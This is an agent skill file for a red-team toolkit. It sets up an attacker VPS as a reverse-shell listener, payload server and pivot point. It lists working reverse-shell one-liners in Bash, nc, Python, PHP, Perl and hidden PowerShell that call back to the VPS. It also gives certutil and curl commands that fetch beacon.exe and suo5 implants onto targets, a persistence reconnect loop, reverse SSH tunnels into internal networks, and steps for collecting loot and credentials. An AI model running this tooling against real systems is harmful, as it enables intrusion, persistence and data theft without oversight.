---
name: vps-reverse-shell
description: 【Infrastructure】Use a self-built VPS (<你的VPS_IP>, SSH private-key login) as a reverse-shell landing point and relay: 9000-9999 port listeners, driving non-interactive sessions, payload delivery, reverse tunnels
whenToUse: When the target cannot call back to the local machine / you need a fixed public listening port / you need a long-lived pivot / you need the agent to push commands into a reverse shell itself
role: exploit
category: Infrastructure
tags: [vps, payload, listener]
enabled: true
---

# VPS Relay and Reverse Shell (<你的VPS_IP>)

A self-built public VPS acts as **reverse-shell landing point + payload delivery point + internal-network pivot**. The target only needs internet access,
so you bounce a shell to ports 9000-9999 on the VPS; the agent issues commands and reads back output **non-interactively** through tmux sessions.

## When to use / when not to

| Scenario | Choice |
| --- | --- |
| The target can connect directly to the local machine (same segment, has a public IP) | Listen locally, **no need** for the VPS |
| The target can only egress; the local machine is inside a NAT | ✅ Use the VPS — this is the main scenario |
| The target is a cloud host/container with restricted egress but can egress 80/443 | ✅ Use the VPS's 9000-9999 (if blocked, use 443/80-class ports, see troubleshooting) |
| You only need one command's result | Prefer the HTTP channel of a web vulnerability/RCE — steadier and stealthier than a reverse shell |

## Assets and Credentials

```
Host    : <你的VPS_IP> (Tencent Cloud, Ubuntu 24.04, 2C2G, hostname <你的VPS_主机名>)
User    : ubuntu (passwordless sudo)
Privkey : ~/.dsh/redteam/toolkit/vps/id_rsa          ← permissions 600, never copy into a repo/chat
Ports   : 9000-9999                                  ← the cloud security group only opens this range
Script  : ~/.dsh/redteam/toolkit/vps/vps.sh
```

**Key discipline**: the private key exists only at that path. Under no circumstances write private-key contents into skill files, reports, repositories, or conversations.

The same VPS may already have ports/sessions taken by other exercises; run `$VPS status` before starting, and **never kill sessions that do not belong to this exercise**.

## Quick Start

```bash
VPS=~/.dsh/redteam/toolkit/vps/vps.sh

$VPS status                 # see VPS status, free ports, existing sessions
$VPS listen                 # automatically pick a free port and start listening (or $VPS listen 9000)
# → once you have the port, execute a reverse command via the vulnerability on the target (see next section)
$VPS send 9000 'id; uname -a'      # after the target calls back, push commands
$VPS read 9000 60                  # read back output
$VPS kill 9000                     # mandatory cleanup when done
```

`listen` uses tmux + rlwrap + an **auto re-listen loop**: when a connection drops it starts listening again, which suits repeated triggering.

## Tool Usage (vps.sh)

| Subcommand | Purpose |
| --- | --- |
| `status` | VPS identity, OS, tool readiness, 9000-9999 occupancy, tmux sessions |
| `port` | Return a free port within 9000-9999 |
| `listen [port]` | Start a persistent listener (auto-select if port omitted), print the target-side command template |
| `sessions` | List tmux sessions on the VPS |
| `send <port> '<cmd>'` | **Push a command into an already-connected reverse shell** (the agent's main path) |
| `read <port> [lines]` | Read back recent output of that session (default 200 lines) |
| `watch <port>` | Continuously refresh output (for humans) |
| `attach <port>` | Take over the session with local tmux (for humans, exit with `Ctrl-B D`) |
| `kill <port>` | Close the listener + clean up the session + free the port |
| `serve [port] [dir]` | Start an HTTP server on the VPS for the target to download payloads (default 9008) |
| `push <local> [remote]` | Upload a file to the VPS |
| `get <remote> [local]` | Fetch a file from the VPS (pull target artifacts back) |
| `sh '<command>'` | Execute an arbitrary command directly on the VPS |

Environment variables can override: `VPS_HOST`, `VPS_KEY`.

## Target-side Reverse Payloads (replace the port with the one you are listening on)

```bash
# Bash (most common)
bash -c 'bash -i >& /dev/tcp/<你的VPS_IP>/9000 0>&1'
bash -c 'exec bash -i &>/dev/tcp/<你的VPS_IP>/9000 <&1'

# nc family (versions with -e)
nc <你的VPS_IP> 9000 -e /bin/bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <你的VPS_IP> 9000 > /tmp/f

# Python (fallback when nc is absent, python2/3 compatible)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<你的VPS_IP>",9000));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/bash","-i"])'

# PHP (common after getting a shell on the web side)
php -r '$s=fsockopen("<你的VPS_IP>",9000);exec("/bin/bash -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="<你的VPS_IP>";$p=9000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# Windows PowerShell
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('<你的VPS_IP>',9000);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
```

**URL encoding**: when going through a web vulnerability (command injection/RCE), URL-encode the whole payload before passing it, so `&` and `>` are not truncated.

## Session Upgrade and Stabilization

A bare `nc` shell has no TTY: `sudo` and `su` will not work, and `vi`/`top` misbehave. Upgrade it:

```bash
# Execute on the target (python3 has the highest install rate)
python3 -c 'import pty;pty.spawn("/bin/bash")'
# or
script -qc /bin/bash /dev/null
```

```bash
# Local side (after attach) make Ctrl-C/arrow keys work
# Inside the reverse shell, press: Ctrl-Z
stty raw -echo; fg
# Press Enter twice, then
export TERM=xterm; export SHELL=/bin/bash; stty rows 40 cols 160
```

**More robust option: socat full-TTY listener** (socat is installed on the VPS):

```bash
$VPS sh "tmux new-session -d -s rt-pty -t '' 'socat file:\`tty\`,raw,echo=0 tcp-listen:9000,reuseaddr'"
# Target side
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<你的VPS_IP>:9000
```

Auto-reconnect on drop (target-side loop):

```bash
while true; do bash -c 'bash -i >& /dev/tcp/<你的VPS_IP>/9000 0>&1'; sleep 10; done &
```

## Payload Delivery (using the VPS as a file relay)

```bash
$VPS serve 9100 ~/rt/payloads        # start an HTTP server on the VPS
$VPS push ./suo5 /home/ubuntu/rt/payloads/
# Target side (Linux)
curl -O http://<你的VPS_IP>:9100/suo5  or  wget http://<你的VPS_IP>:9100/suo5
# Target side (Windows)
certutil -urlcache -split -f http://<你的VPS_IP>:9100/beacon.exe C:\Windows\Temp\a.exe
powershell -c "iwr http://<你的VPS_IP>:9100/beacon.exe -OutFile C:\Windows\Temp\a.exe"
```

**Retrieving loot**: `$VPS get /home/ubuntu/rt/loot/dump.zip ~/.dsh/redteam/engagements/<target>/runs/`

## Reverse Tunnels and Relaying

When the target is inside an internal network and unreachable locally, use the VPS as a pivot:

```bash
# Reverse tunnel: VPS:9200 → target's internal 10.0.0.5:8080 (execute on the target)
ssh -R 9200:10.0.0.5:8080 -N -f -o StrictHostKeyChecking=no -i <key on the target> ubuntu@<你的VPS_IP>
# Then access from the local machine through the VPS: ssh -L 8080:127.0.0.1:9200 ubuntu@<你的VPS_IP>

# socat port forwarding (on the VPS)
$VPS sh "tmux new-session -d -s fwd-9200 'socat TCP-LISTEN:9200,reuseaddr,fork TCP:10.0.0.5:8080'"
```

For WebShell scenarios pair with the `suo5-tunnel` skill: keep the suo5 client locally, transfer the server to the target, and route the tunnel exit through the VPS for stability.

## Discipline (mandatory)

1. **Port discipline**: use only 9000-9999; before opening a listener confirm the port is free with `$VPS port` or `$VPS status`; **never occupy/kill 9001, 9007, 9009 or the `cap/sh/up/www` sessions**.
2. **Always run `$VPS kill <port>` when done**; do not leave bare listeners behind (both a resource drain and a trace).
3. **Store credentials locally, never on the VPS**: write passwords/hashes captured on the target into the local asset database with `redteam_credential_add` (plaintext in `secret_value`), keep artifacts under the local `runs/`; **do not write credentials into the VPS home directory**.
4. **The VPS IP is visible to the target**: it is part of this exercise's infrastructure; do not leave additional personal information beyond it on the target.
5. **Storage**: for every successful shell record with `redteam_access_add` (host/account/method/privilege/session reference); record each credential with `redteam_credential_add`; archive attack scripts with `redteam_attack_file_add`.
6. **Every command sent via `send` must yield evidence readable from `read`**; redirect important output to a file first and `get` it back, so the tmux scrollback buffer is not flushed away.

## Troubleshooting

| Symptom | Handling |
| --- | --- |
| Target cannot call back | First confirm the listener is really up: `$VPS sessions` + `$VPS sh "ss -ltnp \| grep <port>"`; then confirm the target can egress (on the target, `curl -s http://<你的VPS_IP>:<port>` returning a connection success means the port is reachable) |
| Port outside range / switch port | The cloud security group only opens 9000-9999; out-of-range always fails |
| Repeated disconnects | Add a `while true` reconnect loop on the target side; or use the socat full-TTY option |
| Output appears but commands do not execute | The payload was truncated by URL handling (`&`/`>`); URL-encode the whole payload |
| Garbled CJK text | On the target `export LANG=C.UTF-8`, or before `read` set `tmux set -t rt-<port> utf8 on` |
| No TTY, `sudo` errors | Upgrade the PTY (see above) |
| Local port probe says "everything is connectable" | The local gateway answers SYN-ACK on any port, so **local `nc -z` cannot determine VPS port reachability**; verify from an external node or from the target itself |

## Relationship to Other Skills

- `suo5-tunnel`: WebShell → SOCKS5 tunnel, with the exit able to go through this VPS
- `webshell-toolkit`: Behinder/Godzilla/AntSword, management after obtaining a WebShell
- `cn-proxy-pool`: add proxies when you need a domestic egress IP (do not modify host network configuration)
- `active-scan` / `fofa-recon`: continue mapping once the internal network is reachable
